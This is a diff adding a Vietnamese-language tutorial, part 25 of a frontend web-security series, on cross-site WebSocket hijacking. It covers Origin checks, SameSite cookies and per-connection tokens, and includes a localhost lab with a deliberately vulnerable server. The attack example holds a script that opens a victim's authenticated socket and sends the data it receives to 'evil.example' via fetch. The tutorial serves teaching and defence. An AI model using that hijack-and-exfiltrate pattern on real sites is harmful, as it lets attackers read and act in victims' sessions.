@@ -1,0 +1,232 @@
+---
+title: 'Web Security for Frontend Devs · Part 25 — Cross-Site WebSocket Hijacking (CSWSH)'
+description: 'Bonus track: the WebSocket handshake carries the victim cookies and the browser never applies CORS to it — so any site can open an authenticated socket if the server skips the Origin check. The mechanism, the defenses, and a live simulator.'
+pubDate: 2026-06-28
+tags: [web-security, frontend, websocket, web_security_10]
+series: web-security
+seriesOrder: 25
+draft: false
+---
+
+> **Phần 25 — Nhánh bonus** trong series Web Security for Frontend Devs. Trước: Tiếp:
+
+Bạn chuyển realtime sang WebSocket — chat, thông báo, giá live. Bảo mật của bạn dựa trên cookie phiên như mọi khi. Nhưng WebSocket có một sự khác biệt chí mạng so với `fetch`: **trình duyệt không áp CORS lên handshake**. Hệ quả là một họ tấn công ít người biết nhưng dễ dính — **Cross-Site WebSocket Hijacking (CSWSH)**, đôi khi gọi là "CSRF cho WebSocket".
+
+---
+
+## Mô hình tư duy: handshake là HTTP mang cookie, không CORS
+
+Một kết nối WebSocket bắt đầu bằng một **HTTP request Upgrade** bình thường:
+
+```http
+GET /ws HTTP/1.1
+Host: target.example
+Upgrade: websocket
+Origin: https://evil.example
+Cookie: session=…        ← trình duyệt TỰ đính kèm cookie của target
+```
+
+Hai điểm chết người:
+
+1. Như mọi request cross-site, trình duyệt **tự gửi cookie** của `target.example` (trừ khi `SameSite` chặn).
+2. **Không có CORS** cho WebSocket: không preflight, không `Access-Control-Allow-Origin`. JS của `evil.example` `new WebSocket('wss://target.example/ws')` được phép — và còn **đọc được** dữ liệu trả về (khác hẳn `fetch` no-cors).
+
+Nếu server xác thực **chỉ bằng cookie** và **không kiểm `Origin`**, thì `evil.example` mở được một socket **đã đăng nhập** trong phiên nạn nhân, rồi đọc/gửi như chính nạn nhân.
+
+```js
+// chạy trên evil.example khi nạn nhân đang đăng nhập target
+const ws = new WebSocket("wss://target.example/ws"); // cookie tự đính kèm
+ws.onmessage = (e) => fetch("https://evil.example/c?d=" + encodeURIComponent(e.data));
+ws.onopen = () => ws.send(JSON.stringify({ cmd: "dumpInbox" }));
+```
+
+Khác CSRF kinh điển ([Phần 4](/blog/web-security-04-csrf-samesite-cookies/)) ở chỗ: CSRF là "ghi mù" (không đọc được phản hồi). CSWSH cho kẻ tấn công kênh **hai chiều, đọc được** — nguy hiểm hơn nhiều.
+
+---
+
+## Vì sao `wss://` không cứu bạn
+
+`wss://` chỉ là TLS — nó mã hoá đường truyền, không xác thực *ai* mở socket. Một trang `https://evil.example` vẫn mở `wss://target.example` bình thường. Mã hoá ≠ uỷ quyền.
+
+---
+
+## Phòng thủ
+
+### 1. Kiểm `Origin` ở server (bắt buộc)
+
+Đây là phòng thủ chính, và phải làm **phía server** vì không có CORS. Khi nhận handshake, so `Origin` với allowlist; không khớp thì từ chối:
+
+```js
+// Node ws
+import { WebSocketServer } from "ws";
+const ALLOWED = new Set(["https://app.example", "https://admin.example"]);
+
+const wss = new WebSocketServer({ noServer: true });
+server.on("upgrade", (req, socket, head) => {
+  if (!ALLOWED.has(req.headers.origin)) {
+    socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
+    socket.destroy();
+    return;
+  }
+  wss.handleUpgrade(req, socket, head, (ws) => wss.emit("connection", ws, req));
+});
+```
+
+`Origin` do trình duyệt đặt và **JS không sửa được** trên request thật, nên đáng tin cho mục đích này (lưu ý: client không-trình-duyệt giả được `Origin`, nên đừng coi nó là xác thực — chỉ là chống lạm dụng cross-site từ trình duyệt).
+
+### 2. `SameSite` cho cookie phiên
+
+`SameSite=Strict`/`Lax` khiến handshake **cross-site** không mang cookie → socket mở ra nhưng **đăng xuất**, không đọc được gì riêng tư. Lớp nền giống [Phần 4](/blog/web-security-04-csrf-samesite-cookies/)/[Phần 21](/blog/web-security-21-xs-leaks-cross-site-leaks/).
+
+### 3. Token xác thực cho mỗi kết nối (không phải cookie)
+
+Đừng chỉ dựa vào cookie môi trường. Yêu cầu một **token** mà chỉ app thật lấy được (ví dụ token đời ngắn do server cấp, gửi trong frame đầu sau khi mở):
+
+```js
+// client thật: app.example đọc token từ API rồi gửi qua socket
+ws.onopen = () => ws.send(JSON.stringify({ type: "auth", token: csrfToken }));
+```
+
+Kẻ tấn công không đọc được token đó (SOP chặn nó đọc trang `target.example`), nên dù mở được socket cũng không xác thực nổi. Đừng để token trong **query string** của URL `wss://…?token=` — nó rò qua log/referrer.
+
+> Ánh xạ phòng thủ: **`Origin` (chặn handshake)** + **`SameSite` (bỏ cookie cross-site)** + **token mỗi kết nối (xác thực thật)**. Xếp nhiều lớp.
+
+---
+
+## Thử ngay — trình mô phỏng CSWSH
+
+Bật/tắt ba phòng thủ phía server rồi cho `evil.example` mở socket. Xem từng bước handshake — cookie có đính kèm không, server có chấp nhận `Origin` không, socket có được xác thực không — và khi nào kẻ tấn công đọc được tin nhắn riêng tư của nạn nhân.
+
+<iframe
+  src="/tools/cswsh-demo/"
+  title="Interactive cross-site WebSocket hijacking simulator"
+  loading="lazy"
+  style="width:100%;height:1000px;border:1px solid var(--color-border);border-radius:8px;background:#0a0a0a;"
+></iframe>
+
+Mở demo đầy đủ:
+
+---
+
+## Lab thực hành — tái hiện an toàn
+
+Dựng một WebSocket server "dễ bị tấn công" rồi vá nó.
+
+### Chuẩn bị
+
+```bash
+mkdir -p /tmp/cswsh && cd /tmp/cswsh && npm init -y >/dev/null && npm i ws >/dev/null
+cat > server.mjs <<'EOF'
+import { WebSocketServer } from "ws";
+const CHECK_ORIGIN = process.env.CHECK_ORIGIN === "1";
+const ALLOWED = new Set(["http://localhost:5000"]);
+const wss = new WebSocketServer({ port: 7000, verifyClient: (info) => {
+  if (!CHECK_ORIGIN) return true;                 // vulnerable by default
+  return ALLOWED.has(info.origin);                // the fix
+}});
+wss.on("connection", (ws, req) => {
+  console.log("connection from origin:", req.headers.origin);
+  ws.send(JSON.stringify({ secret: "private balance $84,210" }));
+});
+console.log("ws://localhost:7000  (CHECK_ORIGIN=" + CHECK_ORIGIN + ")");
+EOF
+node server.mjs
+```
+
+### Lab — "evil" mở socket từ origin khác
+
+```bash
+# terminal 2: phục vụ trang tấn công trên origin khác (cổng 5050)
+mkdir -p /tmp/cswsh/evil && cd /tmp/cswsh/evil
+cat > index.html <<'EOF'
+<!doctype html><meta charset="utf-8"><title>evil</title>
+<pre id="o"></pre>
+<script>
+  const ws = new WebSocket("ws://localhost:7000");
+  ws.onmessage = (e) => o.textContent += "stolen ← " + e.data + "\n";
+  ws.onerror   = () => o.textContent += "blocked (handshake refused)\n";
+</script>
+EOF
+python3 -m http.server 5050 >/dev/null 2>&1 &
+echo "open http://localhost:5050/"
+```
+
+Mở `http://localhost:5050/` với server đang chạy mặc định (`CHECK_ORIGIN` tắt): trang "evil" **nhận được** message bí mật. Giờ dừng server và chạy lại với `CHECK_ORIGIN=1 node server.mjs` — handshake bị từ chối, không rò gì.
+
+Đã chứng minh: không kiểm `Origin` → bất kỳ origin nào hijack được; kiểm `Origin` → chặn.
+
+### Dọn dẹp
+
+```bash
+kill %1 2>/dev/null; rm -rf /tmp/cswsh
+```
+
+---
+
+## Checklist phòng tránh
+
+1. **Luôn kiểm `Origin`** ở server khi nhận handshake; allowlist chặt.
+2. Đặt **`SameSite=Strict`/`Lax`** cho cookie phiên.
+3. Thêm **token xác thực mỗi kết nối**, không chỉ cookie môi trường.
+4. **Không** để token trong query string của URL `wss://`.
+5. Nhớ `wss://` chỉ mã hoá, **không** uỷ quyền.
+6. Áp rate-limit & timeout cho socket; validate mọi message như input không tin cậy ([Phần 10](/blog/web-security-10-input-validation-open-redirect-threat-model/)).
+
+---
+
+## Liên hệ các phần trước
+
+CSWSH là [CSRF (Phần 4)](/blog/web-security-04-csrf-samesite-cookies/) nâng cấp lên kênh **đọc được, hai chiều** — và `SameSite` là phòng thủ chung của cả hai. Việc trình duyệt **gửi** cross-origin nhưng spec không phủ CORS cho WebSocket đúng là "khe hở gửi/đọc" của [Phần 1](/blog/web-security-01-browser-security-same-origin-policy/). Đọc được dữ liệu phiên còn liên hệ tới [XS-Leaks (Phần 21)](/blog/web-security-21-xs-leaks-cross-site-leaks/).
+
+---
+
+## Bài tập / Exercises
+
+**1.** Vì sao CORS không bảo vệ endpoint WebSocket như nó bảo vệ `fetch`?
+
+<details>
+<summary>Lời giải</summary>
+
+Trình duyệt **không áp CORS lên handshake WebSocket** — không preflight, không kiểm `Access-Control-Allow-Origin`. JS cross-origin mở được socket *và đọc được* dữ liệu. Vì vậy phải tự kiểm `Origin` phía server.
+</details>
+
+**2.** CSWSH khác CSRF kinh điển ở điểm nào khiến nó nguy hiểm hơn?
+
+<details>
+<summary>Lời giải</summary>
+
+CSRF là "ghi mù": kẻ tấn công kích hoạt request nhưng **không đọc** được phản hồi. CSWSH cho kênh **hai chiều, đọc được** — vừa gửi lệnh vừa nhận dữ liệu riêng tư của nạn nhân.
+</details>
+
+**3.** Trong simulator, bật chỉ "SameSite". Socket có mở không, và vì sao vẫn an toàn?
+
+<details>
+<summary>Lời giải</summary>
+
+Socket có thể **mở** (nếu không kiểm `Origin`), nhưng handshake cross-site **không mang cookie** do `SameSite`, nên kết nối **đăng xuất** — không có dữ liệu phiên để đọc. An toàn, dù lý tưởng vẫn nên thêm kiểm `Origin`.
+</details>
+
+Nâng cao:Trong simulator, tìm phòng thủ **đơn lẻ** nào đủ chặn rò dữ liệu, rồi giải thích vì sao kết hợp `Origin` + token vẫn tốt hơn (gợi ý: client không-trình-duyệt giả `Origin`).
+
+---
+
+## Điểm chính
+
+- Handshake WebSocket **mang cookie** và **không bị CORS** — nền của CSWSH.
+- `evil.example` mở socket đã-đăng-nhập rồi **đọc/gửi** như nạn nhân (hai chiều, tệ hơn CSRF).
+- `wss://` chỉ mã hoá, không uỷ quyền.
+- Phòng thủ: **kiểm `Origin` server** + **`SameSite`** + **token mỗi kết nối**, xếp lớp.
+
+---
+
+## Nguồn
+
+- PortSwigger — [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking).
+- OWASP — [Testing for WebSockets security](https://owasp.org/www-project-web-security-testing-guide/) và [WebSocket security cheatsheet notes](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets).
+- MDN — [The WebSocket API](https://developer.mozilla.org/docs/Web/API/WebSockets_API) và [`Origin` header](https://developer.mozilla.org/docs/Web/HTTP/Reference/Headers/Origin).
+
+---
+
+## Series
+
+Các phần bonus xếp trên mười phần lõi và nhánh nâng cao. Sợi chỉ từ [Phần 4](/blog/web-security-04-csrf-samesite-cookies/): **cookie môi trường tự đi theo mọi kết nối — kênh nào dựa vào chúng mà không kiểm nguồn gốc đều mở cho kẻ tấn công cưỡi phiên của bạn**.
